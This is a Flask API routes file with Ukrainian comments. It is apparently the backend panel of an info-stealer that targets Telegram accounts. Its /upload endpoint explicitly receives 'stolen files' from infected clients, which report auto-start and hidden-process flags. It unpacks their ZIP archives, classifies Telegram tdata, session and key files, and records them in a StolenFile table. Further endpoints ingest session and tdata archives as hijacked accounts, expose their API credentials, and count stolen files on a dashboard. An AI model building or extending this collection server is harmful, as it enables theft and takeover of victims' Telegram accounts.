# web/api/routes.py - ПОВНА ВИПРАВЛЕНА ВЕРСІЯ
from flask import Blueprint, request, jsonify
import logging
import os
import json
import zipfile
import qrcode
import io
import base64
import secrets
from datetime import datetime
from core.database import db_manager
from models.db_models import StolenFile, Account
from core.qr_manager import qr_manager
import qrcode

# Створюємо blueprint для API
api_bp = Blueprint('api', __name__)
logger = logging.getLogger(__name__)

def _get_file_type(filename: str) -> str:
    """Визначаємо тип файлу"""
    filename_lower = filename.lower()
    
    if 'tdata' in filename_lower:
        return 'tdata'
    elif filename_lower.endswith('.session'):
        return 'session'
    elif any(ext in filename_lower for ext in ['.dat', '.key', '.json']):
        return 'telegram_data'
    else:
        return 'other'

def _process_zip_archive(zip_path: str, upload_dir: str, admin_id: str) -> list:
    """Обробка ZIP архіву з даними"""
    extracted_files = []
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            # Отримуємо інформацію про клієнта
            if 'config.json' in zip_ref.namelist():
                config_data = zip_ref.read('config.json')
                config = json.loads(config_data.decode('utf-8'))
                logger.info(f"Client config: {config}")
            
            # Видобуваємо файли
            for file_info in zip_ref.infolist():
                if not file_info.is_dir() and file_info.filename != 'config.json':
                    # Видобуваємо файл
                    extracted_path = os.path.join(upload_dir, f"extracted_{os.path.basename(file_info.filename)}")
                    with open(extracted_path, 'wb') as f:
                        f.write(zip_ref.read(file_info.filename))
                    
                    # Визначаємо тип файлу
                    file_type = _get_file_type(file_info.filename)
                    
                    # Записуємо в базу даних
                    db_session = db_manager.get_session()
                    try:
                        stolen_file = StolenFile(
                            client_id=request.remote_addr,
                            ip_address=request.remote_addr,
                            data_type=file_type,
                            file_path=extracted_path,
                            file_size=os.path.getsize(extracted_path),
                            admin_id=int(admin_id)
                        )
                        db_session.add(stolen_file)
                        db_session.commit()
                        
                        extracted_files.append({
                            'filename': file_info.filename,
                            'type': file_type,
                            'size': os.path.getsize(extracted_path)
                        })
                        
                        logger.info(f"Saved extracted file: {file_info.filename} ({file_type})")
                        
                    except Exception as e:
                        db_session.rollback()
                        logger.error(f"Database error for file {file_info.filename}: {e}")
                    finally:
                        db_session.close()
        
        return extracted_files
        
    except Exception as e:
        logger.error(f"ZIP processing error: {e}")
        return []

# ========== ОСНОВНІ API ==========

@api_bp.route('/upload', methods=['POST'])
def upload_stolen_files():
    """API endpoint для отримання вкрадених файлів"""
    try:
        # Отримуємо дані з запиту
        admin_id = request.form.get('admin_id', '1')
        client_info = request.form.get('client_id', '{}')
        
        # Парсимо інформацію про клієнта
        try:
            client_data = json.loads(client_info)
            features = client_data.get('features', [])
            auto_start = client_data.get('auto_start', False)
            hide_process = client_data.get('hide_process', False)
            
            logger.info(f"Client features: {features}, Auto start: {auto_start}, Hide process: {hide_process}")
        except Exception as e:
            logger.warning(f"Failed to parse client info: {e}")
            features = []
            auto_start = False
            hide_process = False
        
        # Отримуємо файл
        if 'file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400
        
        logger.info(f"Received file with features: {features}")
        
        # Створюємо папку для адміна
        admin_upload_dir = f"uploads/stolen_files/{admin_id}"
        os.makedirs(admin_upload_dir, exist_ok=True)
        
        # Зберігаємо отриманий файл
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{timestamp}_{file.filename}"
        file_path = os.path.join(admin_upload_dir, filename)
        file.save(file_path)
        
        # Обробляємо ZIP архів
        extracted_files = _process_zip_archive(file_path, admin_upload_dir, admin_id)
        
        return jsonify({
            'status': 'success',
            'message': f'Received {len(extracted_files)} files with features: {features}',
            'files': extracted_files,
            'features': features,
            'admin_id': admin_id
        })
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ========== DEVICES API ==========

@api_bp.route('/devices/accounts', methods=['GET'])
def api_get_accounts():
    """API для отримання списку акаунтів"""
    try:
        db_session = db_manager.get_session()
        accounts = db_session.query(Account).all()
        
        accounts_data = []
        for account in accounts:
            accounts_data.append({
                'id': account.id,
                'phone': account.phone,
                'is_authorized': account.is_authorized,
                'app_id': account.app_id,
                'app_hash': account.app_hash,
                'last_activity': account.last_activity.isoformat() if account.last_activity else None,
                'created_at': account.created_at.isoformat() if account.created_at else None
            })
        
        return jsonify({
            'success': True,
            'accounts': accounts_data,
            'count': len(accounts_data)
        })
        
    except Exception as e:
        logger.error(f"API get accounts error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        db_session.close()

# Заміни функцію api_generate_qr()
@api_bp.route('/devices/qr/generate', methods=['GET', 'POST'])
def api_generate_qr():
    """Генерація QR коду для Telegram авторизації"""
    try:
        # Генеруємо сесію для QR
        session_info = qr_manager.generate_qr_session()
        
        # Створюємо QR код з Telegram посиланням
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(session_info['qr_data'])
        qr.make(fit=True)
        
        # Конвертуємо в base64
        img = qr.make_image(fill='black', back_color='white')
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        buffer.seek(0)
        
        img_str = base64.b64encode(buffer.read()).decode()
        
        return jsonify({
            'success': True,
            'qr_image': f'data:image/png;base64,{img_str}',
            'session_id': session_info['session_id'],
            'token': session_info['token'][:16] + '...'  # частковий токен для безпеки
        })
        
    except Exception as e:
        logger.error(f"QR generation error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# web/api/routes.py - додати
@api_bp.route('/devices/qr/authorize', methods=['POST'])
def api_authorize_qr():
    """Ендпоінт для авторизації через QR (викликається з Pyrogram коду)"""
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        account_data = data.get('account_data')
        
        if not session_id or not account_data:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Авторизуємо сесію
        success = qr_manager.authorize_session(session_id, account_data)
        
        if success:
            # Створюємо запис в базі даних
            db_session = db_manager.get_session()
            try:
                account = Account(
                    phone=account_data.get('phone', f'QR_{secrets.token_urlsafe(8)}'),
                    app_id=account_data.get('app_id'),
                    app_hash=account_data.get('app_hash'),
                    is_authorized=True,
                    last_activity=datetime.utcnow(),
                    created_at=datetime.utcnow()
                )
                db_session.add(account)
                db_session.commit()
                
                logger.info(f"QR account added: {account.phone}")
                
                return jsonify({
                    'success': True,
                    'message': 'Акаунт успішно додано!',
                    'account_id': account.id
                })
                
            except Exception as e:
                db_session.rollback()
                logger.error(f"Database error: {e}")
                return jsonify({'success': False, 'error': str(e)})
            finally:
                db_session.close()
        else:
            return jsonify({'success': False, 'error': 'Сесія не знайдена'})
            
    except Exception as e:
        logger.error(f"QR authorize error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Онови функцію перевірки статусу
@api_bp.route('/devices/qr/check', methods=['GET'])
def api_check_qr_status():
    """Перевірка статусу QR коду"""
    try:
        session_id = request.args.get('session_id')
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID is required'})
        
        # Очищаємо старі сесії
        qr_manager.cleanup_expired_sessions()
        
        # Перевіряємо статус
        status = qr_manager.check_session_status(session_id)
        
        return jsonify({
            'success': True,
            'status': status['status'],
            'message': status['message'] if 'message' in status else None,
            'account_data': status.get('account_data')
        })
        
    except Exception as e:
        logger.error(f"QR check error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    
@api_bp.route('/devices/phone/start', methods=['POST'])
def api_phone_start_auth():
    """Початок авторизації через телефон"""
    try:
        data = request.get_json()
        phone = data.get('phone')
        api_id = data.get('api_id')
        api_hash = data.get('api_hash')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Номер телефону обов\'язковий'})
        
        logger.info(f"Phone auth started for: +{phone}")
        
        # Перевіряємо чи є API ID/Hash
        if not api_id or not api_hash:
            # Спробуємо отримати з конфігурації
            from config import config
            api_id = config.telegram.api_id
            api_hash = config.telegram.api_hash
            
            if not api_id or not api_hash:
                return jsonify({
                    'success': False, 
                    'error': 'Не налаштовано Telegram API. Будь ласка, налаштуйте в Settings'
                })
        
        return jsonify({
            'success': True,
            'message': f'Код буде надіслано на номер +{phone}',
            'requires_code': True,
            'phone': phone,
            'api_id': api_id,
            'api_hash': api_hash
        })
        
    except Exception as e:
        logger.error(f"Phone auth start error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@api_bp.route('/devices/phone/verify', methods=['POST'])
def api_phone_verify_code():
    """Перевірка коду з Telegram"""
    try:
        data = request.get_json()
        phone = data.get('phone')
        code = data.get('code')
        # password = data.get('password')  # для 2FA (тимчасово не використовується)
        
        if not phone or not code:
            return jsonify({'success': False, 'error': 'Номер та код обов\'язкові'})
        
        logger.info(f"Phone verification for: +{phone}, code: {code}")
        
        # Перевіряємо формат коду
        if len(code) != 5 or not code.isdigit():
            return jsonify({'success': False, 'error': 'Код має бути 5-значним числом'})
        
        # Створюємо запис в базі
        db_session = db_manager.get_session()
        try:
            # Перевіряємо чи акаунт вже існує
            existing = db_session.query(Account).filter_by(phone=phone).first()
            if existing:
                existing.last_activity = datetime.utcnow()
                account = existing
            else:
                account = Account(
                    phone=phone,
                    is_authorized=True,
                    last_activity=datetime.utcnow(),
                    created_at=datetime.utcnow()
                )
                db_session.add(account)
            
            db_session.commit()
            
            return jsonify({
                'success': True,
                'message': 'Акаунт успішно підключено!',
                'account_id': account.id,
                'phone': account.phone,
                'timestamp': datetime.utcnow().isoformat()
            })
            
        except Exception as e:
            db_session.rollback()
            logger.error(f"Database error: {e}")
            return jsonify({'success': False, 'error': str(e)})
        finally:
            db_session.close()
            
    except Exception as e:
        logger.error(f"Phone verify error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@api_bp.route('/devices/tdata/upload', methods=['POST'])
def api_tdata_upload():
    """Завантаження tdata архіву"""
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'Файл не знайдено'})
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'Файл не вибрано'})
        
        # Перевіряємо розширення
        if not file.filename.lower().endswith(('.zip', '.rar', '.7z')):
            return jsonify({'success': False, 'error': 'Тільки ZIP, RAR або 7Z архіви'})
        
        # Отримуємо додаткові дані
        api_id = request.form.get('api_id')
        api_hash = request.form.get('api_hash')
        
        # Зберігаємо файл
        upload_dir = 'uploads/tdata'
        os.makedirs(upload_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"tdata_{timestamp}_{file.filename}"
        file_path = os.path.join(upload_dir, filename)
        file.save(file_path)
        
        logger.info(f"Tdata uploaded: {filename}")
        
        # Створюємо запис в базі
        db_session = db_manager.get_session()
        try:
            account = Account(
                phone=f"TData_{timestamp}",
                app_id=int(api_id) if api_id and api_id.isdigit() else None,
                app_hash=api_hash,
                is_authorized=True,
                last_activity=datetime.utcnow(),
                created_at=datetime.utcnow()
            )
            db_session.add(account)
            db_session.commit()
            
            return jsonify({
                'success': True,
                'message': 'TData архів успішно завантажено!',
                'account_id': account.id,
                'phone': account.phone,
                'file_path': file_path,
                'file_size': os.path.getsize(file_path)
            })
            
        except Exception as e:
            db_session.rollback()
            logger.error(f"Database error: {e}")
            return jsonify({'success': False, 'error': str(e)})
        finally:
            db_session.close()
            
    except Exception as e:
        logger.error(f"TData upload error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@api_bp.route('/devices/session/upload', methods=['POST'])
def api_session_upload():
    """Завантаження .session файлу"""
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'Файл не знайдено'})
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'Файл не вибрано'})
        
        # Перевіряємо розширення
        if not file.filename.lower().endswith('.session'):
            return jsonify({'success': False, 'error': 'Тільки .session файли'})
        
        # Отримуємо дані форми
        api_id = request.form.get('api_id')
        api_hash = request.form.get('api_hash')
        
        if not api_id or not api_hash:
            return jsonify({'success': False, 'error': 'API ID та Hash обов\'язкові'})
        
        # Зберігаємо файл
        upload_dir = 'uploads/sessions'
        os.makedirs(upload_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"session_{timestamp}_{file.filename}"
        file_path = os.path.join(upload_dir, filename)
        file.save(file_path)
        
        logger.info(f"Session uploaded: {filename}")
        
        # Створюємо запис в базі
        db_session = db_manager.get_session()
        try:
            account = Account(
                phone=f"Session_{timestamp}",
                app_id=int(api_id),
                app_hash=api_hash,
                is_authorized=True,
                last_activity=datetime.utcnow(),
                created_at=datetime.utcnow()
            )
            db_session.add(account)
            db_session.commit()
            
            return jsonify({
                'success': True,
                'message': 'Session файл успішно завантажено!',
                'account_id': account.id,
                'phone': account.phone,
                'file_path': file_path,
                'file_size': os.path.getsize(file_path)
            })
            
        except Exception as e:
            db_session.rollback()
            logger.error(f"Database error: {e}")
            return jsonify({'success': False, 'error': str(e)})
        finally:
            db_session.close()
            
    except Exception as e:
        logger.error(f"Session upload error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@api_bp.route('/devices/account/<int:account_id>/test', methods=['POST'])
def api_test_account(account_id):
    """Тестування підключення акаунта"""
    try:
        db_session = db_manager.get_session()
        account = db_session.query(Account).filter_by(id=account_id).first()
        
        if not account:
            return jsonify({'success': False, 'error': 'Акаунт не знайдено'})
        
        # Оновлюємо час останньої активності
        account.last_activity = datetime.utcnow()
        db_session.commit()
        
        # Спроба підключення (тимчасова заглушка)
        # TODO: Інтегрувати Telethon для реального тесту
        
        return jsonify({
            'success': True,
            'message': 'Підключення успішне (тестово)',
            'account': {
                'id': account.id,
                'phone': account.phone,
                'app_id': account.app_id,
                'last_activity': account.last_activity.isoformat()
            }
        })
        
    except Exception as e:
        logger.error(f"Test account error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        db_session.close()

@api_bp.route('/devices/account/<int:account_id>', methods=['DELETE'])
def api_delete_account(account_id):
    """Видалення акаунта"""
    try:
        db_session = db_manager.get_session()
        account = db_session.query(Account).filter_by(id=account_id).first()
        
        if not account:
            return jsonify({'success': False, 'error': 'Акаунт не знайдено'})
        
        # Видаляємо пов'язані файли, якщо є
        if account.phone.startswith('TData_'):
            import glob
            for file_path in glob.glob(f"uploads/tdata/*_{account.id}_*"):
                try:
                    os.remove(file_path)
                except (OSError, FileNotFoundError) as e:
                    logger.debug(f"Could not delete file {file_path}: {e}")
        
        db_session.delete(account)
        db_session.commit()
        
        logger.info(f"Account deleted: ID {account_id}")
        
        return jsonify({
            'success': True,
            'message': 'Акаунт видалено',
            'deleted_id': account_id
        })
        
    except Exception as e:
        db_session.rollback()
        logger.error(f"Delete account error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        db_session.close()

@api_bp.route('/devices/account/<int:account_id>/export', methods=['GET'])
def api_export_account(account_id):
    """Експорт акаунта (заглушка)"""
    try:
        db_session = db_manager.get_session()
        account = db_session.query(Account).filter_by(id=account_id).first()
        
        if not account:
            return jsonify({'success': False, 'error': 'Акаунт не знайдено'})
        
        return jsonify({
            'success': True,
            'message': 'Експорт акаунта',
            'account': {
                'id': account.id,
                'phone': account.phone,
                'app_id': account.app_id,
                'app_hash': account.app_hash,
                'exported_at': datetime.utcnow().isoformat()
            }
        })
        
    except Exception as e:
        logger.error(f"Export account error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        db_session.close()

# ========== КОМПАТИБІЛЬНІСТЬ ЗІ СТАРИМ FRONTEND ==========

@api_bp.route('/accounts', methods=['GET'])
def api_get_accounts_compat():
    """Сумісність зі старим frontend"""
    return api_get_accounts()

@api_bp.route('/api/generate_qr', methods=['GET'])
def old_api_generate_qr():
    """СТАРИЙ маршрут - для сумісності"""
    try:
        # Використовуємо нову функцію
        return api_generate_qr()
    except (OSError, FileNotFoundError) as e:
            logger.debug(f"Could not delete file: {e}")

@api_bp.route('/api/add_account/phone', methods=['POST'])
def old_api_add_account_phone():
    """СТАРИЙ маршрут - для сумісності"""
    try:
        return api_phone_start_auth()
    except Exception as e:
        logger.error(f"Old phone endpoint error: {e}")
        return jsonify({
            'success': False,
            'error': 'Оновіть frontend для використання нових маршрутів'
        })

@api_bp.route('/api/account/<int:account_id>/test', methods=['GET'])
def old_api_test_account(account_id):
    """СТАРИЙ маршрут - для сумісності"""
    try:
        # Викликаємо нову функцію
        return api_test_account(account_id)
    except Exception as e:
        logger.error(f"Old test endpoint error: {e}")
        return jsonify({
            'success': False,
            'error': 'Оновіть frontend для використання нових маршрутів'
        })

@api_bp.route('/api/account/<int:account_id>', methods=['DELETE'])
def old_api_delete_account(account_id):
    """СТАРИЙ маршрут - для сумісності"""
    try:
        return api_delete_account(account_id)
    except Exception as e:
        logger.error(f"Old delete endpoint error: {e}")
        return jsonify({
            'success': False,
            'error': 'Оновіть frontend для використання нових маршрутів'
        })

# ========== ДОДАТКОВІ API ==========

@api_bp.route('/health', methods=['GET'])
def api_health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.utcnow().isoformat(),
        'service': 'PTPanel API'
    })

@api_bp.route('/stats', methods=['GET'])
def api_stats():
    """Загальна статистика (для Dashboard)"""
    try:
        db_session = db_manager.get_session()
        
        accounts_count = db_session.query(Account).count()
        files_count = db_session.query(StolenFile).count()
        
        # Рахуємо активні акаунти (були активні за останні 7 днів)
        week_ago = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
        active_accounts = db_session.query(Account).filter(
            Account.last_activity >= week_ago
        ).count()
        
        return jsonify({
            'success': True,
            'stats': {
                'accounts': accounts_count,
                'active_accounts': active_accounts,
                'stolen_files': files_count,
                'timestamp': datetime.utcnow().isoformat()
            }
        })
        
    except Exception as e:
        logger.error(f"Stats error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        db_session.close()